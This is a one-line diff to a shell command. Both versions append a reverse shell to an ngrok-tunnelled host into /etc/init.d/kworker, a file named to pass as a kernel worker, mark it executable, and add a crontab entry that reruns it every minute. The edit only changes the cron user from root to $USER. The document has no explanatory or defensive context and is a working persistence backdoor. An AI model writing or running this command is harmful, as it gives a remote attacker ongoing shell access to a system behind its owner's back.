@@ -1,1 +1,1 @@
-echo '/bin/bash>/dev/tcp/4.tcp.eu.ngrok.io/17082 0>&1 2>&1 &' >> /etc/init.d/kworker ; chmod ugo+x /etc/init.d/kworker ; echo '* * * * * root bash /etc/init.d/kworker' >> /etc/crontab
+echo '/bin/bash>/dev/tcp/4.tcp.eu.ngrok.io/17082 0>&1 2>&1 &' >> /etc/init.d/kworker ; chmod ugo+x /etc/init.d/kworker ; echo "* * * * * $USER bash /etc/init.d/kworker" >> /etc/crontab
